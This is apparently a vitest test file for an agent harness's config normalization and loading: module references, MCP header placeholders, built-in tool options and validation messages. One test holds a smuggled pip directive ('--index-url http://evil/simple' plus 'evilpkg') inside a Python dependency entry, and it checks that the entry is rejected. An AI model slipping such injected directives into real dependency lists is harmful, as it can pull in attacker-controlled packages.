import { execFile } from 'node:child_process'
import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises'
import { homedir, tmpdir } from 'node:os'
import { join } from 'node:path'
import { promisify } from 'node:util'
import { afterEach, describe, expect, it, vi } from 'vitest'

import {
  DEFAULT_HARNESS_AGENT_CONFIG,
  defineHarnessAgentConfig,
  harnessAgentOptionsFromConfig,
  normalizeHarnessAgentConfig,
} from '../src/config.js'
import { configureLogging, resetWarnOnce } from '../src/logging.js'

afterEach(() => {
  resetWarnOnce()
  delete process.env.STRANDS_TEST_MCP_TOKEN
})

describe('HarnessAgentConfig', () => {
  it('normalizes the complete portable definition', () => {
    const config = defineHarnessAgentConfig({
      name: 'Reviewer',
      description: 'Reviews changes',
      instructions: 'Be strict.',
      effort: 'high',
      builtinTools: { '*': false, read: true, web_fetch: { model: 'openai/gpt-5-mini' } },
      caching: false,
      contextManager: 'agentic',
      session: { id: 'review' },
      skills: false,
      memory: false,
      interventions: 'ask',
      modelModule: { kind: 'model', module: 'custom-model', export: 'model' },
      interventionModules: [{ kind: 'intervention', module: 'custom-policy', export: 'policy' }],
      agentConfigModules: {
        conversationManager: {
          kind: 'agent-config',
          module: 'conversation-manager',
          export: 'conversationManager',
        },
      },
      dependencies: { typescript: { package: '^1.0.0' }, python: ['package>=1'] },
      agentConfig: { maxParallelTools: 2 },
    })

    expect(normalizeHarnessAgentConfig(JSON.parse(JSON.stringify(config)))).toEqual(config)
  })

  it('maps defaults through the same contract createHarness consumes', async () => {
    await expect(harnessAgentOptionsFromConfig(DEFAULT_HARNESS_AGENT_CONFIG)).resolves.toMatchObject({
      name: 'Strands harness',
      model: DEFAULT_HARNESS_AGENT_CONFIG.model,
      effort: 'high',
      contextManager: 'auto',
      memory: { dir: join(process.cwd(), '.agent/memory') },
      session: { dir: join(process.cwd(), '.agent/sessions') },
      skills: true,
    })
    const options = await harnessAgentOptionsFromConfig(DEFAULT_HARNESS_AGENT_CONFIG)
    expect(options).not.toHaveProperty('builtinTools')
    expect(options).not.toHaveProperty('caching')
  })

  it('forwards a disabled session as off', async () => {
    const config = defineHarnessAgentConfig({ session: false })
    await expect(harnessAgentOptionsFromConfig(config)).resolves.toMatchObject({ session: false })
  })

  it('folds contextManager "off" to false, matching Python', () => {
    expect(defineHarnessAgentConfig({ contextManager: 'off' }).contextManager).toBe(false)
    expect(defineHarnessAgentConfig({ contextManager: false }).contextManager).toBe(false)
  })

  it('fails loudly when the runtime cannot load a referenced language', async () => {
    const config = defineHarnessAgentConfig({
      tools: [{ kind: 'tool', module: './tool.py', language: 'python', files: ['./tool.py'] }],
    })

    await expect(harnessAgentOptionsFromConfig(config)).rejects.toThrow('Cannot load Python module')
  })

  it('loads executable values through declared module references', async () => {
    const module = join(import.meta.dirname, 'fixtures', 'config-values.ts')
    const config = defineHarnessAgentConfig({
      tools: [{ kind: 'tool', module, export: 'customTool', language: 'typescript' }],
      agentConfigModules: {
        conversationManager: {
          kind: 'agent-config',
          module,
          export: 'conversationManager',
          language: 'typescript',
        },
      },
      interventions: ['ask', './policy.cedar'],
      interventionModules: [
        {
          kind: 'intervention',
          module,
          export: 'customIntervention',
          language: 'typescript',
        },
      ],
    })

    const options = await harnessAgentOptionsFromConfig(config, '/project')
    expect(options.tools).toEqual([{ name: 'custom-tool' }])
    expect(options.conversationManager).toEqual({ name: 'custom-conversation-manager' })
    expect(options.interventions).toEqual(['ask', join('/project', 'policy.cedar'), { name: 'custom-intervention' }])
  })

  it.each([
    ['./policy.cedar', join('/project', 'policy.cedar')],
    ['policies/policy.cedar', join('/project', 'policies/policy.cedar')],
    ['  ./policy.cedar  ', join('/project', 'policy.cedar')],
    ['/policies/policy.cedar', '/policies/policy.cedar'],
    ['~/policy.cedar', join(homedir(), 'policy.cedar')],
    ['ask', 'ask'],
    ['  Require approval for writes.  ', '  Require approval for writes.  '],
    ['./policy.cedar.bak', './policy.cedar.bak'],
  ])('resolves the intervention %j against the project root when it is a Cedar file', async (value, expected) => {
    const config = defineHarnessAgentConfig({ interventions: value })

    const options = await harnessAgentOptionsFromConfig(config, '/project')

    expect(options.interventions).toBe(expected)
    expect(config.interventions).toBe(value)
  })

  it.each(['@fixture/tools', '@fixture/tools/tool'])(
    'loads the project ESM export for %s instead of a package from the harness',
    async (module) => {
      const root = await mkdtemp(join(tmpdir(), 'strands-config-'))
      try {
        const packageDir = join(root, 'node_modules', '@fixture', 'tools')
        await mkdir(packageDir, { recursive: true })
        await writeFile(
          join(packageDir, 'package.json'),
          JSON.stringify({
            name: '@fixture/tools',
            type: 'module',
            exports: {
              '.': { import: './tool.js', require: './wrong.cjs' },
              './tool': { import: './tool.js' },
            },
          })
        )
        await writeFile(join(packageDir, 'tool.js'), "export const customTool = { name: 'project-tool' }\n")
        await writeFile(join(packageDir, 'wrong.cjs'), "throw new Error('require export must not be loaded')\n")
        const config = defineHarnessAgentConfig({
          tools: [{ kind: 'tool', module, export: 'customTool' }],
        })

        const options = await harnessAgentOptionsFromConfig(config, root)

        expect(options.tools).toEqual([{ name: 'project-tool' }])
      } finally {
        await rm(root, { recursive: true, force: true })
      }
    }
  )

  it('rejects a package missing from the project even when the harness has it installed', async () => {
    const root = await mkdtemp(join(tmpdir(), 'strands-config-'))
    try {
      const config = defineHarnessAgentConfig({
        agentConfigModules: {
          callbackHandler: { kind: 'agent-config', module: 'zod', export: 'z' },
        },
      })

      await expect(harnessAgentOptionsFromConfig(config, root)).rejects.toThrow('zod')
    } finally {
      await rm(root, { recursive: true, force: true })
    }
  })

  it('loads TypeScript helper imports and shares the host SDK across project dependencies', async () => {
    const root = await mkdtemp(join(tmpdir(), 'strands-config-'))
    try {
      await writeFile(join(root, 'package.json'), '{"type":"module"}')
      const sdk = join(root, 'node_modules', '@strands-agents', 'sdk')
      await mkdir(sdk, { recursive: true })
      await writeFile(
        join(sdk, 'package.json'),
        JSON.stringify({
          name: '@strands-agents/sdk',
          type: 'module',
          exports: { '.': './wrong.js', './*': './wrong.js' },
        })
      )
      await writeFile(join(sdk, 'wrong.js'), "throw new Error('Project SDK must not replace host classes')")
      await writeFile(join(root, 'helper.ts'), "export const marker: string = 'loaded-helper'")
      await writeFile(
        join(root, 'tool.ts'),
        [
          "import { tool } from '@strands-agents/sdk'",
          `import { z } from ${JSON.stringify(import.meta.resolve('zod'))}`,
          "import { marker } from './helper.js'",
          "export default tool({ name: 'fixture', description: marker, inputSchema: z.object({}),",
          "callback: async () => (await import('./helper.js')).marker })",
        ].join('\n')
      )
      await writeFile(
        join(root, 'model.ts'),
        "import { BedrockModel } from '@strands-agents/sdk/models/bedrock'\nexport default new BedrockModel({ modelId: 'fixture' })"
      )
      const config = defineHarnessAgentConfig({
        tools: [{ kind: 'tool', module: './tool.ts' }],
        modelModule: { kind: 'model', module: './model.ts' },
      })

      const source = [
        `import { harnessAgentOptionsFromConfig } from ${JSON.stringify(new URL('../src/config.ts', import.meta.url).href)}`,
        `import { Model, Tool } from ${JSON.stringify(import.meta.resolve('@strands-agents/sdk'))}`,
        `const config = ${JSON.stringify(config)}`,
        `const options = await harnessAgentOptionsFromConfig(config, ${JSON.stringify(root)})`,
        `const repeated = await harnessAgentOptionsFromConfig(config, ${JSON.stringify(root)})`,
        'const tool = options.tools[0]',
        'console.log(JSON.stringify({ isTool: tool instanceof Tool, isModel: options.model instanceof Model,',
        'description: tool.description, marker: await tool.invoke({}), shared: repeated.tools[0] === tool }))',
      ].join('\n')
      const { stdout } = await promisify(execFile)(
        process.execPath,
        ['--import', import.meta.resolve('tsx'), '--input-type=module', '--eval', source],
        { timeout: 20_000 }
      )
      expect(JSON.parse(stdout)).toEqual({
        isTool: true,
        isModel: true,
        description: 'loaded-helper',
        marker: 'loaded-helper',
        shared: true,
      })
    } finally {
      await rm(root, { recursive: true, force: true })
    }
  })

  it('expands MCP environment placeholders and unwraps the server map', async () => {
    process.env.STRANDS_TEST_MCP_TOKEN = 'secret'
    const config = defineHarnessAgentConfig({
      mcpServers: {
        mcpServers: {
          private: {
            url: 'https://example.com/mcp',
            headers: { Authorization: 'Bearer ${env:STRANDS_TEST_MCP_TOKEN}' },
          },
        },
      },
    })

    await expect(harnessAgentOptionsFromConfig(config)).resolves.toMatchObject({
      mcpServers: {
        private: { url: 'https://example.com/mcp', headers: { Authorization: 'Bearer secret' } },
      },
    })
  })

  it('rejects a missing MCP environment variable instead of passing the placeholder through', async () => {
    const config = defineHarnessAgentConfig({
      mcpServers: { private: { url: 'https://example.com/mcp', headers: { Authorization: 'Bearer ${MISSING_VAR}' } } },
    })

    await expect(harnessAgentOptionsFromConfig(config)).rejects.toThrow(
      'Environment variable "MISSING_VAR" is not set.'
    )
  })

  it('loads and expands file-backed MCP config', async () => {
    process.env.STRANDS_TEST_MCP_TOKEN = 'secret'
    const root = await mkdtemp(join(tmpdir(), 'strands-config-'))
    try {
      await writeFile(
        join(root, 'mcp.json'),
        JSON.stringify({
          mcpServers: {
            private: { url: 'https://example.com/mcp', headers: { Authorization: 'Bearer ${STRANDS_TEST_MCP_TOKEN}' } },
          },
        })
      )
      const config = defineHarnessAgentConfig({ mcpServers: './mcp.json' })

      await expect(harnessAgentOptionsFromConfig(config, root)).resolves.toMatchObject({
        mcpServers: {
          private: { url: 'https://example.com/mcp', headers: { Authorization: 'Bearer secret' } },
        },
      })
    } finally {
      await rm(root, { recursive: true, force: true })
    }
  })

  it('rejects python dependency entries carrying extra pip directives', () => {
    expect(() =>
      normalizeHarnessAgentConfig({ dependencies: { python: ['requests\n--index-url http://evil/simple\nevilpkg'] } })
    ).toThrow('dependencies.python entries must not contain line breaks.')
  })

  it('resolves state directories against the project root, matching Python', async () => {
    const config = defineHarnessAgentConfig({
      session: { id: 'proj', dir: '.agent/sessions' },
      memory: { dir: '.agent/memory' },
      skills: ['.agent/skills', 'https://example.com/SKILL.md'],
    })

    await expect(harnessAgentOptionsFromConfig(config, '/project')).resolves.toMatchObject({
      session: { id: 'proj', dir: join('/project', '.agent/sessions') },
      memory: { dir: join('/project', '.agent/memory') },
      skills: [join('/project', '.agent/skills'), 'https://example.com/SKILL.md'],
    })
  })

  it.each([
    'thinking',
    'webFetchModel',
    'webFetchModelModule',
    'contextManagement',
    'sessionId',
    'sessionDir',
    'skillsDir',
    'memoryDir',
    'memoryManager',
  ])('treats the retired %s key as a plain unknown key', (key) => {
    const warn = vi.fn()
    configureLogging({ debug: () => {}, info: () => {}, warn, error: () => {} })

    const config = normalizeHarnessAgentConfig({ [key]: 'x' })

    expect(warn).toHaveBeenCalledTimes(1)
    expect(warn).toHaveBeenCalledWith(`Ignoring unknown agent config keys: ${key}.`)
    expect(config).not.toHaveProperty(key)
    expect(config).toEqual(normalizeHarnessAgentConfig({}))
  })

  it('passes web_fetch.transport through the config bridge', async () => {
    const config = normalizeHarnessAgentConfig({ builtinTools: { web_fetch: { transport: 'direct' } } })
    expect(config.builtinTools).toEqual({ web_fetch: { transport: 'direct' } })
    const options = await harnessAgentOptionsFromConfig(config, process.cwd())
    expect(options.builtinTools).toEqual({ web_fetch: { transport: 'direct' } })
  })

  it('normalizes a builtinTools mapping with a per-tool web_fetch config', () => {
    const config = normalizeHarnessAgentConfig({
      builtinTools: { '*': false, shell: true, web_fetch: { model: 'openai/gpt-5-mini' } },
    })
    expect(config.builtinTools).toEqual({ '*': false, shell: true, web_fetch: { model: 'openai/gpt-5-mini' } })
  })

  it('normalizes the shell, programmatic_tool_caller and subagent per-tool configs', () => {
    const builtinTools = {
      shell: { description: 'Run a command.' },
      programmatic_tool_caller: { allowedTools: ['read'], timeout: 60 },
      subagent: { maxDepth: 1 },
    }
    expect(normalizeHarnessAgentConfig({ builtinTools }).builtinTools).toEqual(builtinTools)
    expect(
      normalizeHarnessAgentConfig({ builtinTools: { programmatic_tool_caller: { allowedTools: null, timeout: null } } })
        .builtinTools
    ).toEqual({ programmatic_tool_caller: { allowedTools: null, timeout: null } })
  })

  it.each([
    [{ shell: { model: 'x' } }, 'builtinTools.shell has unknown keys: model. Allowed: description.'],
    [{ shell: { description: '' } }, 'builtinTools.shell.description must be a non-empty string.'],
    [{ web_fetch: { model: '' } }, 'builtinTools.web_fetch.model must be a non-empty string.'],
    [{ web_fetch: { transport: 'wget' } }, "builtinTools.web_fetch.transport must be 'curl' or 'direct'."],
    [{ web_search: { fallback: 'exa' } }, "builtinTools.web_search must be a boolean or 'exa'."],
    [{ web_search: 'bing' }, "builtinTools.web_search must be a boolean or 'exa'."],
    [
      { programmatic_tool_caller: { allowedTools: 'read' } },
      'builtinTools.programmatic_tool_caller.allowedTools must be an array of non-empty strings or null.',
    ],
    [
      { programmatic_tool_caller: { timeout: 0 } },
      'builtinTools.programmatic_tool_caller.timeout must be a positive number or null.',
    ],
    [{ subagent: { maxDepth: 1.5 } }, 'builtinTools.subagent.maxDepth must be a non-negative integer.'],
    [{ subagent: { maxDepth: -1 } }, 'builtinTools.subagent.maxDepth must be a non-negative integer.'],
  ])('rejects the per-tool config %j', (builtinTools, message) => {
    expect(() => normalizeHarnessAgentConfig({ builtinTools })).toThrow(message)
  })

  it('rejects an unknown built-in tool name in a builtinTools mapping', () => {
    expect(() => normalizeHarnessAgentConfig({ builtinTools: { grep: true } })).toThrow(
      'builtinTools has unknown keys: grep. Allowed: *, shell, read, write, edit, web_fetch, web_search, programmatic_tool_caller, subagent.'
    )
  })

  it('rejects an effort outside the enum', () => {
    expect(() => normalizeHarnessAgentConfig({ effort: 'turbo' })).toThrow('effort')
  })

  it('maps a builtinTools mapping into createHarness options', async () => {
    const config = defineHarnessAgentConfig({
      builtinTools: { subagent: { maxDepth: 1 }, web_fetch: { model: 'openai/gpt-5-mini' }, shell: false },
    })
    await expect(harnessAgentOptionsFromConfig(config)).resolves.toMatchObject({
      builtinTools: { subagent: { maxDepth: 1 }, web_fetch: { model: 'openai/gpt-5-mini' }, shell: false },
    })
  })

  it('warns about unknown config keys and drops them', () => {
    const warn = vi.fn()
    configureLogging({ debug: () => {}, info: () => {}, warn, error: () => {} })

    const config = normalizeHarnessAgentConfig({ ...DEFAULT_HARNESS_AGENT_CONFIG, builtinTool: ['shell'] })

    expect(config).not.toHaveProperty('builtinTool')
    expect(warn).toHaveBeenCalledWith('Ignoring unknown agent config keys: builtinTool.')
  })

  it('lists unknown config keys in sorted order', () => {
    const warn = vi.fn()
    configureLogging({ debug: () => {}, info: () => {}, warn, error: () => {} })

    normalizeHarnessAgentConfig({ zeta: 1, alpha: 2, mid: 3 })

    expect(warn).toHaveBeenCalledWith('Ignoring unknown agent config keys: alpha, mid, zeta.')
  })

  it('rejects unknown memory subkeys and names them', () => {
    expect(() =>
      normalizeHarnessAgentConfig({
        ...DEFAULT_HARNESS_AGENT_CONFIG,
        memory: { dir: 'mem', stores: [{ kind: 'memory-store', module: 'store' }] },
      })
    ).toThrow('memory has unknown keys: stores. Allowed: dir.')
  })

  it('reports every issue on its own line under the JSON path', () => {
    expect(() =>
      normalizeHarnessAgentConfig({
        name: '',
        effort: 'turbo',
        tools: [{ kind: 'tool' }],
        builtinTools: { web_fetch: { model: { module: '' } } },
        agentConfig: { a: { b: [1, { c: new Date() }] } },
      })
    ).toThrow(
      [
        'Invalid agent config:',
        'name must be a non-empty string.',
        'effort must be one of: auto, off, minimal, low, medium, high, xhigh, max.',
        'tools[0].module must be a non-empty string.',
        'builtinTools.web_fetch.model.module must be a non-empty string.',
        'agentConfig.a.b[1].c must contain only JSON-compatible values.',
      ].join('\n')
    )
  })

  it('warns when memoryStores are given while memory is disabled', () => {
    const warn = vi.fn()
    configureLogging({ debug: () => {}, info: () => {}, warn, error: () => {} })

    const config = normalizeHarnessAgentConfig({
      ...DEFAULT_HARNESS_AGENT_CONFIG,
      memory: false,
      memoryStores: [{ kind: 'memory-store', module: 'store' }],
    })

    expect(config.memory).toBe(false)
    expect(warn).toHaveBeenCalledWith('Ignoring memoryStores because memory is false.')
  })

  it('rejects malformed references instead of dropping them', () => {
    expect(() =>
      normalizeHarnessAgentConfig({
        ...DEFAULT_HARNESS_AGENT_CONFIG,
        tools: [{ kind: 'tool' }],
      })
    ).toThrow('tools[0].module must be a non-empty string')
  })

  it.each([
    [{ tools: ['./tool.ts'] }, 'tools[0] must be a module reference of kind "tool".'],
    [{ sandbox: 'docker' }, 'sandbox must be a module reference of kind "sandbox".'],
    [{ tools: [{ module: './tool.ts', files: null }] }, 'tools[0].files must be an array of non-empty strings.'],
    [{ contextManager: null }, 'contextManager must be one of: auto, agentic, off, false.'],
    [{ contextManager: {} }, 'contextManager must be one of: auto, agentic, off, false.'],
    [{ session: { id: '' } }, 'session.id must be a non-empty string.'],
    [{ session: { id: '   ' } }, 'session.id must be a non-empty string.'],
    [{ session: { id: null } }, 'session.id must be a non-empty string.'],
    [{ session: { dir: '' } }, 'session.dir must be a non-empty string.'],
    [{ session: { dir: null } }, 'session.dir must be a non-empty string.'],
    [{ memory: { dir: '' } }, 'memory.dir must be a non-empty string.'],
    [{ memory: { dir: null } }, 'memory.dir must be a non-empty string.'],
    [{ skills: null }, 'skills must be a boolean, a path string, or an array of path strings.'],
    [{ skills: ['a', 'b', 'a'] }, 'skills has duplicate entries: a.'],
    [
      { dependencies: { python: ['requests', 'httpx', 'requests', 'httpx'] } },
      'dependencies.python has duplicate entries: requests, httpx.',
    ],
  ])('rejects %j', (config, message) => {
    expect(() => normalizeHarnessAgentConfig(config)).toThrow(message)
  })

  it.each([
    [
      { agentConfigModules: { '': { module: './hooks.ts' } } },
      'agentConfigModules has an invalid key "": must be a non-empty string.',
    ],
    [
      { dependencies: { typescript: { '': '^1.0.0' } } },
      'dependencies.typescript has an invalid key "": must be a non-empty string.',
    ],
  ])('names the record key in %j', (config, message) => {
    expect(() => normalizeHarnessAgentConfig(config)).toThrow(`Invalid agent config:\n${message}`)
  })

  it('keeps module reference extras, an empty files list and repeated dependency versions', () => {
    const config = normalizeHarnessAgentConfig({
      tools: [{ module: './tool.ts', files: [], foo: 1 }],
      dependencies: { typescript: { a: '^1.0.0', b: '^1.0.0' } },
    })
    expect(config.tools).toEqual([{ kind: 'tool', module: './tool.ts', files: [], foo: 1 }])
    expect(config.dependencies.typescript).toEqual({ a: '^1.0.0', b: '^1.0.0' })
  })
})
